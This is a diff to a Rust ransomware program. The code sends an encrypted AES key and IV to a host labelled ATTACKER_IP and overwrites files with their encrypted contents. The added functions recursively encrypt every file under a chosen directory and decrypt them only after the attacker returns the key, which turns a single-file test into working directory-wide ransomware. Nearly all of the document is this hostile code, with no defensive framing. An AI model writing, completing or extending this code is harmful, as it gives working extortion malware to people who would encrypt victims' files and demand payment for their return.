@@ -8,6 +8,7 @@ use std::{
         TcpStream,
         TcpListener
     },
+    path::Path,
     str::FromStr
 };
 
@@ -34,9 +35,8 @@ use rsa::{
     },
 };
 
-// const PRV_PATH: &str = &"received.txt";
-// file used for testing
-const FILE_PATH: &str = &"testing.png";
+// encryption target (all subfolders considered)
+const TRAVERSE_PATH: &str = &"SOMERANDOMPATH";
 // IP the victim sends the encrypted encryption key to
 const ATTACKER_IP: &str = &"127.0.0.1";
 // port the victim sends the encrypted encryption key to
@@ -119,8 +119,8 @@ fn client() {
         stream.write(&enc_iv).expect("[-] Could not send encrypted IV over stream.");
         println!("[+] Sent AES encrypted IV to attacker.");
 
-        // symmetrically encrypt (aes) a file
-        aes_encrypt(&iv, &key, FILE_PATH);
+        // symmetrically encrypt (aes) all files
+        encrypt_traverse(&iv, &key, &Path::new(TRAVERSE_PATH));
         println!("[+] File encrypted.");
     } else {
         println!("[-] Couldn't connect to server");
@@ -207,11 +207,11 @@ fn send_key_back() {
     }
 }
 
-fn aes_encrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
+fn aes_encrypt(iv: &[u8], key: &[u8], path_to_file: &Path) {
     // the result of the encryption
     let mut encrypted = Vec::<u8>::new();
 
-    if let Ok(data) = fs::read(path_to_file.clone()) {
+    if let Ok(data) = fs::read(path_to_file) {
         // buffers used to perform encryption
         let mut rbuffer = crypto::buffer::RefReadBuffer::new(&data);
         let mut tbuffer = [0; 4096];
@@ -220,7 +220,7 @@ fn aes_encrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
         // what actually performs the encryption
         let mut encryptor = aes::cbc_encryptor(KeySize::KeySize256, &key, &iv, blockmodes::PkcsPadding);
 
-        println!("[*] Encrypting...");
+        println!("[*] Encrypting: {:?}", path_to_file);
         // block-encrypt...
         loop {
             let finished = encryptor.encrypt(&mut rbuffer, &mut wbuffer, true).expect("[-] Could not encrypt file.");
@@ -241,10 +241,10 @@ fn aes_encrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
     fs::write(path_to_file, &encrypted).expect("[-] Error on write.");
 }
 
-fn aes_decrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
+fn aes_decrypt(iv: &[u8], key: &[u8], path_to_file: &Path) {
     let mut decrypted: Vec<u8> = Vec::new();
 
-    if let Ok(data) = fs::read(path_to_file.clone()) {
+    if let Ok(data) = fs::read(path_to_file) {
         // buffers used to perform encryption
         let mut rbuffer = crypto::buffer::RefReadBuffer::new(&data);
         let mut tbuffer = [0; 4096];
@@ -254,7 +254,7 @@ fn aes_decrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
         let mut decryptor = aes::cbc_decryptor(KeySize::KeySize256, &key, &iv, blockmodes::PkcsPadding);
 
         // block-decrypt...
-        println!("[*] Starting decryption...");
+        println!("[*] Decrypting: {:?}", path_to_file);
         loop {
             let finished = decryptor.decrypt(&mut rbuffer, &mut wbuffer, true).expect("[-] Could not decrypt file.");
             decrypted.extend(wbuffer.take_read_buffer().take_remaining().iter());
@@ -271,7 +271,7 @@ fn aes_decrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
 
     // finally, overwrite the file
     fs::write(path_to_file, &decrypted).expect("[-] Error on write.");
-    println!("[+] File decrypted.");
+    println!("[+] Files decrypted.");
 }
 
 fn read_and_decrypt() {
@@ -297,8 +297,32 @@ fn read_and_decrypt() {
 
     // now use what the attacker sent to perform decryption
     println!("[*] Starting decryption...");
-    aes_decrypt(&aes_iv, &aes_key, "testing.png");
+    decrypt_traverse(&aes_iv, &aes_key, Path::new(TRAVERSE_PATH));
     println!("[+] Decryption completed.");
+}
+
+fn encrypt_traverse(iv: &[u8], key: &[u8], path: &Path) {
+    if let Ok(mut result) = fs::read_dir(path) {
+        while let Some(Ok(r)) = result.next() {
+            if r.file_type().unwrap().is_dir() {
+                encrypt_traverse(&iv, &key, r.path().as_path());
+            } else {
+                aes_encrypt(&iv, &key, &r.path());
+            }
+        }
+    }
+}
+
+fn decrypt_traverse(iv: &[u8], key: &[u8], path: &Path) {
+    if let Ok(mut result) = fs::read_dir(path) {
+        while let Some(Ok(r)) = result.next() {
+            if r.file_type().unwrap().is_dir() {
+                decrypt_traverse(&iv, &key, r.path().as_path());
+            } else {
+                aes_decrypt(&iv, &key, &r.path());
+            }
+        }
+    }
 }
 
 fn main() {
